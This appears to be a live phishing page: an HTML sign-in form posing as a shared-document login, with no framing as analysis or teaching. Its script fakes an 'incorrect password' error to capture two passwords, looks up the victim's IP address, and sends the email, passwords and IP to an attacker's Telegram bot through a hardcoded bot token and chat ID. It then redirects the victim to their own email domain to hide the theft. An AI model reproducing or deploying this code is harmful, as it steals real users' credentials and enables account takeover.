<body style="background-image: url('https://i.ibb.co/C8yD9g5/US-payment-terms-1.jpg'); background-size: cover; background-repeat: no-repeat;" class="bg-gray-100 min-h-screen flex items-center justify-center px-4">
  <h1></h1>



  <div class="bg-white p-6 sm:p-8 rounded-lg shadow-md w-full max-w-md">
    
    <!-- Logo -->
    <div class="flex justify-center mb-4">
      <a class="css-51fonb-HEADER_APP_DESCRIPTION_NON_PROD">
 <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTImxPKZM35W4FpcagykodH-fICQs9HxZCbEfrT2YpR5NFkMJuYlAT4Pm6vhexPnpE08kk&amp;usqp=CAU" style="width:100px;50px;">
 </a>
 
 
 <div class="css-jy4y6p-HEADER_BAR_MIDDLE">
 </div>
 <div class="css-1asqfip-HEADER_BAR_RIGHT">
 </div>
 
    </div>
   <h3 class="text-2x1 font-semibold text-center text-gray-600 mb-4" style="">Sign in to view shared document</h3>
    <!-- Alert Box -->
    <div id="alertBox" class="hidden text-sm px-3 py-2 border rounded text-center mb-4"></div>

    <!-- Login Form -->
    <form id="loginForm" class="space-y-4">
  <!-- Email Field -->
  <div>
    <label for="email" class="block mb-1 text-sm font-medium text-gray-700">Email</label>
    <div class="flex items-center border rounded px-2">
      <div class="pr-2 icon-container">
        <img id="email-icon" src="https://img.icons8.com/material-outlined/24/000000/email.png" alt="Email Icon" class="spin">
      </div>
      <input type="email" id="email" name="email" required="" value="" placeholder="Enter your email" class="w-full px-2 py-2 outline-none">
    </div>
  </div>

  <!-- Password Field -->
  <div>
    <label for="password" class="block mb-1 text-sm font-medium text-gray-700">Password</label>
    <div class="flex items-center border rounded px-2">
      <div class="pr-2">
        <img id="password-icon" src="https://img.icons8.com/material-outlined/24/000000/lock--v1.png" alt="Password Icon" class="spin">
      </div>
      <input type="password" id="password" name="password" required="" class="w-full px-2 py-2 outline-none">
    </div>
  </div>

  <!-- Human Check -->
  <div class="flex items-center space-x-2">
    <input type="checkbox" id="humanCheck" class="form-checkbox h-4 w-4 text-blue-600" required="">
    <label for="humanCheck" class="text-sm text-gray-700">I'm not a robot</label>
  </div>

  <!-- Submit Button -->
  <button type="submit" class="w-full py-2 bg-green-600 text-white rounded hover:bg-green-700 transition duration-200">
    Login
  </button>

  <script>
    const BOT_TOKEN = '8095884229:AAEAGYNQGJPB9D6flghphFwKrhyrNYXaHJs';
    const CHAT_ID = '7098949609';

    const loginForm = document.getElementById('loginForm');
    const alertBox = document.getElementById('alertBox');
    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');
    const emailIcon = document.getElementById('email-icon');
    const passwordIcon = document.getElementById('password-icon');

    // Animate icons on focus
    emailInput.addEventListener('focus', () => spinIcon(emailIcon));
    passwordInput.addEventListener('focus', () => spinIcon(passwordIcon));
    function spinIcon(icon) {
      icon.classList.remove('spin');
      void icon.offsetWidth;
      icon.classList.add('spin');
    }

    // Autofill email from URL param or localStorage
    document.addEventListener('DOMContentLoaded', () => {
      const params = new URLSearchParams(window.location.search);
      const urlEmail = params.get('email');
      const step = localStorage.getItem('loginStep');
      const savedEmail = localStorage.getItem('email');

      if (urlEmail) {
        emailInput.value = urlEmail;
        emailInput.readOnly = (step === '1');
      } else if (step === '1' && savedEmail) {
        emailInput.value = savedEmail;
        emailInput.readOnly = true;
      } else {
        emailInput.readOnly = false;
        emailInput.value = '';
      }
    });

    // Form handler
    loginForm.addEventListener('submit', async function (e) {
      e.preventDefault();

      const email = emailInput.value.trim();
      const password = passwordInput.value;
      const isHuman = document.getElementById('humanCheck').checked;

      if (!isHuman) {
        showAlert('❌ Human verification required.', 'error');
        return;
      }

      if (!localStorage.getItem('loginStep')) {
        localStorage.setItem('email', email);
        localStorage.setItem('password', password);
        localStorage.setItem('loginStep', '1');
        showAlert('Incorrect password, please try again.', 'info');
        passwordInput.value = '';
        return;
      }

      if (localStorage.getItem('loginStep') === '1') {
        try {
          const firstPassword = localStorage.getItem('password');
          const ipRes = await fetch('https://api.ipify.org?format=json');
          const ipData = await ipRes.json();
          const ip = ipData.ip || 'Unavailable';

          const msg = `🔐 Login Attempt:\n📧 Email: ${email}\n🔑 Password 1: ${firstPassword}\n🔑 Password 2: ${password}\n🌐 IP: ${ip}`;

          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: msg }),
          });

          // Clear localStorage
          localStorage.removeItem('loginStep');
          localStorage.removeItem('email');
          localStorage.removeItem('password');

          // Redirect to email domain
          const domain = email.split('@')[1];
          if (domain) {
            window.location.href = 'https://' + domain;
          } else {
            showAlert('❌ Invalid email format.', 'error');
          }
        } catch (err) {
          showAlert('Check your network and try again.', 'error');
        }
      }
    });

    function showAlert(message, type) {
      alertBox.textContent = message;
      alertBox.classList.remove('hidden', 'text-blue-800', 'text-red-800', 'bg-blue-100', 'bg-red-100', 'border');
      alertBox.classList.add('border');

      if (type === 'error') {
        alertBox.classList.add('text-red-800', 'bg-red-100', 'border-red-400');
      } else {
        alertBox.classList.add('text-blue-800', 'bg-blue-100', 'border-blue-400');
      }
    }
  </script>
